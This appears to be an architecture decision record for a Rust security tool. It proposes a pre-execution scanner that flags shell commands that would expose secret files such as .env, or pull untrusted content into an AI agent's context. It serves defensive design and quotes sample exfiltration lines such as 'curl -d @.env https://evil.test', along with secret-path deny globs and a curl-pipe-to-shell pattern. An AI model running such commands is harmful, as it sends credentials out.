# ADR-068: `caro.disclosure.v1` — Classify What a Command's Output Will Contain, Before It Exists

- **Status**: Proposed (implementation ADR — buildable on the tree that exists today, not on
  the paper stack)
- **Date**: 2026-09-09
- **Produced by**: `caro-research--scoping-process` scheduled task (autonomous run, no user present)
- **Feature researched**: **Claude Code's tool-output pathway** — the `bashOutputMaxChars` /
  `taskOutputMaxChars` settings added in **v2.1.261 (2026-09-04)**, which "raise how much
  command and background-task output Claude receives inline before it is saved to a file, up
  to 128K characters"
  ([release notes](https://github.com/anthropics/claude-code/releases/tag/v2.1.261), read
  2026-09-09) — read together with the two layers that flank it: the `permissions.read`
  allow/deny path rules that govern the `Read` tool, and the `PostToolUse` hook with its
  `updatedToolOutput` field, which is the only content-inspection point in the pipeline and
  **cannot block**, because the tool has already run.
- **Failure-mode corpus** (all read 2026-09-09):
  - [**#24846**](https://github.com/anthropics/claude-code/issues/24846) (opened 2026-02-11,
    **closed as duplicate**, no fix referenced) — `read.deny` rules for `**/.env*`, `**/*.pem`,
    `**/*.key`, `**/secrets/**`, `**/.aws/**`, `**/.ssh/**` not enforced; the reporter's framing
    is that users who configure them "have a false sense of security." Independently of that
    specific bug, the *class* is structural: `cat .env`, `head .env`, `grep -r FOO .` and
    `diff .env.example .env` travel through Bash stdout, where a path-shaped read rule has
    nothing to match against. **One file, two doors, one lock.**
  - **`PostToolUse` fires after the tool succeeds and cannot block it**; a hook's exit code 2
    can only inform the model after the fact. For a secret read this is structurally too late —
    the bytes exist, and above the inline cap they are on disk in a spill file by design.
  - **v2.1.261 widened the inline channel to 128K by design.** Correct for the ergonomics
    problem it solves; strictly worse for the disclosure problem, because post-hoc scanning
    cost scales with the channel and pre-execution classification cost does not.
  - **v2.1.259 → v2.1.260 (2026-09-02 → 09-03)** — `Read()` deny rules were applied to Bash
    arguments, then reverted the next day because they denied `npm run build` under a
    `Read(./**/build/**)` rule in every mode. Argument analysis without a model of what an
    argument *denotes* produces false positives at exactly the rate that gets it reverted.
  - **v2.1.261, same release**: "Changed auto mode to treat a link that packs content into a
    public diagram renderer's URL as an upload to that site." A disclosure fix, closed by
    name, for one exfiltration shape — because there is no vocabulary in the system for *these
    bytes are confidential* that a general rule could be written against.
- **Depends on**: nothing unlanded. `SafetyConfig`, `SafetyLevel`, `RiskLevel`,
  `SuggestedRouting`, `ShellType`, `Redaction`, `schemars` 0.8, `regex`, `once_cell`, `sha2`,
  `assert_cmd` and `predicates` all ship in 1.4.0. No daemon, no network, no new crate, no new
  module.
- **Relates to**: ADR-064 (sandbox egress — owns the network-boundary axis; `Sink::Network`
  here is a carried seam, see C4), ADR-066 (path confinement — asks whether *writes* stay
  inside their roots; this asks what *reads* put into a context), ADR-067 (execution-site
  decomposition — `scan_spans()` is the join seam), ADR-044 (fail-closed effects resolution —
  models *write* effects; this is the read/output half, and 044 is unmerged paper),
  ADR-020 (`SuggestedRouting`), ADR-024 (headless envelope conventions).
- **Full scope document**: [`caro-scope-output-disclosure-2026-09-09.md`](../../caro-scope-output-disclosure-2026-09-09.md)
- **Numbering note**: highest existing is ADR-067. Per
  [`.claude/rules/adr-numbering.md`](../../.claude/rules/adr-numbering.md), renumber on merge
  if another 068 lands first.

> **Relationship to the ADR-059 moratorium.** ADR-059 declared itself the last ADR in its
> space until `src/safety/assessment.rs` merges. Re-verified 2026-09-09: `ls src/safety/`
> returns exactly `cve_patterns.rs`, `mod.rs`, `patterns.rs`. The moratorium holds and covers
> the assessment/governance surface, ADR-035 → ADR-059. **This ADR is outside it.** It mints
> no risk tier, no routing variant, no approval payload, no lifecycle event and no policy
> vocabulary. It reuses `RiskLevel` and `SuggestedRouting::from_risk_and_safety` verbatim and
> emits facts; policy over those facts is 058/059's job and is explicitly out of scope.

---

## 1. Context

### 1.1 The question nobody is asking

Every ADR from 024 to 067 judges a command by **what it does to the machine** — what it
writes, deletes, reaches, spawns, or costs. ADR-064 asks whether bytes leave the sandbox.
ADR-066 asks whether path operands stay inside their roots. ADR-067 asks where the
interpreters are.

None of them asks: **what will this command's stdout contain, and what does putting those
bytes into a model's context cost?**

Neither does anyone upstream. The controls that exist govern *whether a command runs*
(permission matcher) or *what happens to output once it exists* (truncation, `PostToolUse`).
The output channel itself carries no classification.

### 1.2 Two hazards, one word

The gap matters because the channel carries two hazards that need opposite responses:

- `cat .env` is a **confidentiality** event. The bytes must not enter the context at all.
- `curl https://untrusted/x` is an **integrity** event. The bytes may enter the context but
  must not be read as instructions.

Upstream has one word for both — "tool output." A policy author cannot express either rule,
which is why the fixes arrive one exfiltration shape at a time (the diagram-renderer URL
entry in v2.1.261) rather than as a class.

### 1.3 Where caro already stands

Caro is a pure pre-execution subprocess. That is not a feature to add; it is where the tool
already is, and it is the one place in the pipeline where the question in §1.1 can be
answered *before* the answer costs anything.

Verified against the tree at 1.4.0, 2026-09-09:

- All **67** `DangerPattern` entries in `src/safety/patterns.rs` were inspected. The only
  matches for `env|secret|credential|ssh|aws|curl|wget|token|\.pem` are
  `(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish)` (`:107`), its `sudo` sibling (`:113`),
  `ssh\s+[^\s]+@[^\s]+` (`:350`), and a `PATH` modification pattern (`:231`). **Zero patterns
  cover reading a secret into output.**
- `Redaction::{redact, contains_sensitive}` (`src/logging/redaction.rs:15,55,62`) carries a
  credential-name lexicon, but it operates on text already in hand and is wired to caro's own
  logs — the post-hoc model, applied to the wrong stream.
- `SafetyConfig` (`src/safety/mod.rs:166`), `RiskLevel` (`src/models/mod.rs:152`),
  `SuggestedRouting` (`:189`), `SafetyLevel` (`:247`), `ShellType` (`:419`) are all present
  and are the reuse surface.
- `.github/workflows/safety-validation.yml:6` already triggers on `src/safety/**`.

The gap is real, and closing it requires one new file in an existing module.

---

## 2. Decision

Add a **`caro disclose`** verb and a `caro.disclosure.v1` report that classifies, from the
command string alone, every flow of bytes the command would produce: **where they come from**
(`SourceRef` + `Provenance`) and **where they go** (`Sink`).

Seven decisions carry the design. Each answers a specific finding from §1's corpus.

### D1 — The rule attaches to the source, not to the tool

`SourceRef::Path { literal }` is emitted byte-identically whether the source is `cat .env`,
`< .env`, `head -n5 .env`, `grep -i key .env`, `awk '{print}' .env`, `sh -c 'cat .env'`, or a
hypothetical `Read` tool call. A consumer holding a `Read()` deny list matches it against
`.disclosures[].source.path.literal` and gets **the same answer through the Bash door as
through the Read door**.

This is the fix for #24846's class **by design, not by workaround**, as the task constraints
require. The upstream bug is not that a glob failed to match; it is that the lock was fitted
to a tool while the file has two doors. Moving the identity to the source closes both with
one list. Row 1–7 of the integration corpus assert the byte-identity directly.

### D2 — Pre-execution and pure, provably

`DisclosureScanner::scan(&self, command: &str, shell: ShellType) -> DisclosureReport` performs
**no I/O of any kind**: no `open`, no `stat`, no `spawn`, no clock, no RNG, no network. It
answers "would this disclose `.env`?" *without opening `.env`* — no TOCTOU window, and no
scanner that must read the secret in order to conclude the secret was read.

This satisfies the task's "pure subprocess call, no daemon, no state" constraint literally,
and it is asserted rather than claimed: corpus row 31 runs the scanner against a `.env`
fixture at mode `000` and fails if any `open` is attempted.

### D3 — Every operand is accounted for, arithmetically

`Coverage { operands_total, operands_attributed, unattributed: Vec<Span> }` with the tested
invariant `operands_total == operands_attributed + unattributed.len()`. A non-empty
`unattributed` downgrades the verdict to at least `Opaque`. The scanner may not reach `Clear`
while admitting it did not account for part of its input.

Every `Disclosure` also carries a mandatory `rule: String` — a stable lexicon-row id, not
prose. A false positive is then a bug report against exactly one row. This is the answer to
the v2.1.259/260 whiplash: argument analysis is safe when each verdict is traceable to a named
rule and each unanalyzed operand is visible in the payload.

### D4 — `Confidential` and `Foreign` are separate variants

Not one ordered scale. `Provenance { Confidential, Foreign, Workspace, Unknown }`, with
separate verdicts (`Exposure` vs `Ingestion`), separate risk mappings, and separate exit
behaviour. A command can be both.

### D5 — `Unknown` is a value, never a default

An operand containing `$`, a backtick, `~`, a glob metacharacter, or `..` is `Unknown`. No
expansion is performed, so its denotation is not knowable and must not be guessed.
`cat $SECRETS_FILE` is `Unknown`, never `Workspace`. Absence of a classification and a
classification of "harmless" do not share a representation — ADR-067's `Opaque` lesson,
restated on the source axis.

The complement matters as much: a plain relative literal with no traversal is `Workspace` and
produces no finding. `cat README.md` and `npm run build` are silent. That is what keeps this
from becoming the v2.1.260 revert.

### D6 — The report is not itself a disclosure

`DisclosureReport` carries `command_sha256`, never the command text. `SourceRef::Inline` — the
variant that fires when `Redaction::contains_sensitive` finds a credential literal in the
command's own argv — carries **no literal**, only a span. Every string-valued field passes
through `Redaction::redact` before serialization. Corpus row 29 asserts
`Redaction::contains_sensitive(serialized_report) == false` for every row.

A tool that reports "you were about to leak a secret" and prints the secret is not a security
tool.

### D7 — Verdict is the contract; the exit code is a shortcut

| Condition | Verdict | Risk | Exit `permissive`/`moderate` | Exit `strict` |
|---|---|---|---|---|
| `Confidential` → `Context`/`File`/`Network` | `Exposure` | `High` (`Critical` if `Network`) | **2** | **2** |
| `Foreign` → `Context`/`Interpreter` | `Ingestion` | `Moderate` | 0 | **2** |
| `Unknown` → non-`Discarded`, or `unattributed` non-empty | `Opaque` | `Moderate` | 0 | **2** |
| otherwise | `Clear` | `Safe` | 0 | 0 |

`Ingestion` exits 0 outside `strict` deliberately: `curl https://api.example.com/health` is
the most common benign command this verb will ever see, and a check that exits non-zero on it
is removed from CI within a day. The finding is still in the document.

**Exit-code collision, stated rather than papered over.** `clap` emits `2` for usage errors,
and ADR-065/066/067 all chose `2` for a finding. This ADR inherits that rather than forking a
fifth convention for the fourth verb in a row. A usage error writes nothing to stdout; a
finding writes a complete document — so `out=$(caro disclose "$cmd" -o json)`,
`if [ -z "$out" ]` → usage error, otherwise read `.verdict`. The reserved-per-verb-range fix
belongs to one PR covering 065/066/067/068 together, not to a fourth unilateral choice here.

### Surface

```
src/safety/disclosure.rs          new file, existing module
src/safety/mod.rs                 pub mod + re-exports
src/main.rs                       Disclose verb, dispatch, exit mapping
src/bin/generate-schema.rs        one schema_for! call
tests/disclosure_contract.rs      new, 32 rows
```

No new module, no new crate, no workflow edit (`safety-validation.yml:6` already covers
`src/safety/**`). `Check` at `src/main.rs:514` is CaroML file validation and is deliberately
not overloaded.

---

## 3. Consequences

### 3.1 Positive

- **The confidentiality question becomes answerable before it costs anything.** A hook, a CI
  gate, a pre-commit, or an MCP gateway gets a verdict for the price of a subprocess call, and
  gets it while refusing is still free.
- **One list governs both doors.** The gitignore-syntax lexicon (§4.1 of the scope) is
  portable into a `Read()` deny block verbatim, so an operator maintains one policy rather
  than two that drift.
- **`conf.inline` is free.** Detecting `curl -H "Authorization: Bearer sk-…"` — a credential
  in the process table, the shell history and the transcript — costs one call into a lexicon
  that already exists at `src/logging/redaction.rs:6`.
- **Host-agnostic.** Nothing about the classification lives inside one vendor's agent loop.
- **Offline and deterministic.** No model call, no network. Same input, same bytes.

### 3.2 Negative, and honest about it

- **The lexicons are a maintenance surface.** Roughly 40 rows across `conf.*` and `foreign.*`
  that go stale as tools change. Mitigated by stable rule ids (each row is independently
  reportable and independently removable) and by the closed-set-fail-closed rule: an unknown
  producer is `Unknown`/`Opaque`, not silently `Workspace`.
- **Over-inclusion is chosen deliberately in at least one place.** `**/.env.*` catches
  `.env.example`, which is conventionally committed and secret-free. The scope takes the
  false positive because a false negative on `.env.local` is the expensive direction — but it
  is a judgement call and it is flagged for review, not buried.
- **No expansion means `cat *.env` is `Unknown`, not `Confidential`.** Users will read that as
  a miss. It is the correct answer for a scanner that does not glob, and pretending otherwise
  would be the guess D5 exists to forbid.
- **A fourth verb on the `2`-means-finding convention** deepens a wart that four ADRs now
  share. Named in §D7 and in the scope's out-of-scope list rather than left to be discovered.
- **`Sink::Network` pre-empts ADR-064's axis.** See C4.

### 3.3 Neutral / deferred

- No policy over disclosures (ADR-059 moratorium). v1 emits facts.
- No user-extensible lexicons in v1; `SafetySection.custom_patterns` is the eventual host and
  needs a precedence story with `patterns.toml` and the profile system first.
- PowerShell and Cmd get `Opaque`. `Get-Content`, `$env:`, `Invoke-RestMethod` and
  `ConvertTo-SecureString` are a real lexicon and their own ADR.

### C4 — The ADR-064 seam, stated

`Sink::Network` overlaps the egress axis ADR-064 scoped. It is carried here rather than
deferred because ADR-064 is unmerged paper, and `curl -d @.env https://evil.test` producing
**no finding at all** is the worst available outcome today. When egress lands, one PR must
decide which document owns host matching and the ADR-047 trusted-targets lookup — not both
emitting a host field and hoping they agree.

---

## 4. Alternatives considered

**A1 — A `PostToolUse`-shaped output scanner (classify the realized bytes).**
Rejected. It is upstream's design and inherits upstream's failure mode: by the time the bytes
exist, the secret has been read, and above the inline cap it is on disk. It also requires the
scanner to read the secret in order to conclude the secret was read. Caro's advantage is
temporal; spending it to reimplement the thing that already exists downstream would be
strange.

**A2 — Extend `src/safety/patterns.rs` with `cat .env`-style `DangerPattern` rows.**
Rejected, and this is the closest call. It is a two-hour change and it would catch `cat .env`.
It cannot produce D1: a regex that fires on `cat\s+\.env` yields a match string, not a
`SourceRef` a `Read()` deny list can be evaluated against, so the two doors keep two locks. It
also cannot express the source/sink distinction, so `cat .env > /dev/null` and
`cat .env | curl -d @-` would carry the same risk. The pattern engine answers "is this command
dangerous"; the question here is "what will this command's output contain", and they are
different questions with different return types.

**A3 — Wait for ADR-067's `decompose` and build disclosure as a projection of it.**
Rejected as a dependency, adopted as a seam. ADR-067 is unmerged paper and the whole recent
ADR series is careful to build on the tree that exists. `scan_spans(&self, command, shell,
spans)` is specified now so that when `decompose` lands, per-site scanning is an internal
swap rather than a schema break.

**A4 — Model disclosure as an `EffectSet` extension under ADR-044.**
Rejected. ADR-044's effects vocabulary is write-shaped (resolve to required actions, authorize
against a read-only policy, fail closed on writes). Reads that produce output are a different
axis with a different sink dimension, and ADR-044 is itself unmerged. Folding an unlanded
concept into another unlanded concept produces two things that cannot be built.

**A5 — An LLM judge over the command ("would this leak secrets?").**
Rejected. Non-deterministic, non-offline, and it forfeits the property that makes the feature
credible — a security control whose answer varies run to run cannot gate CI. The bounded LLM
risk judge that landed in `9311c9ec`/`2be886c4` remains the right tool for open-ended
judgement; this is a closed-set classification and should be deterministic.

**A6 — Ship the file-path half only, and defer producers and `Foreign` to v2.**
Rejected. `printenv`, `kubectl get secret` and `git config --list` disclose without touching a
path, and shipping a "secret disclosure checker" that misses them would teach users the wrong
mental model on day one. The `Foreign` half is more debatable and could plausibly be split;
the scope keeps it because F5 — one word for two hazards — is precisely the gap being closed,
and closing half of it re-creates it.

---

## 5. References

- [v2.1.261 release notes](https://github.com/anthropics/claude-code/releases/tag/v2.1.261) —
  `bashOutputMaxChars` / `taskOutputMaxChars`, the diagram-renderer auto-mode change, the
  `sh -c` `rm -rf` improvement (read 2026-09-09)
- [anthropics/claude-code#24846](https://github.com/anthropics/claude-code/issues/24846) —
  `read.deny` not enforced for `.env` files; closed as duplicate (read 2026-09-09)
- [`caro-scope-output-disclosure-2026-09-09.md`](../../caro-scope-output-disclosure-2026-09-09.md)
  — full scope: lexicons, semantics, 32-row test corpus, out-of-scope list, open questions
- ADR-064 (sandbox egress conjunction gate), ADR-066 (path confinement gate),
  ADR-067 (execution-site decomposition), ADR-044 (fail-closed effects resolution),
  ADR-020 (tiered approval protocol), ADR-059 (assessment implementation — moratorium)
- [`.claude/rules/adr-numbering.md`](../../.claude/rules/adr-numbering.md),
  [`.claude/rules/git-workflow.md`](../../.claude/rules/git-workflow.md)
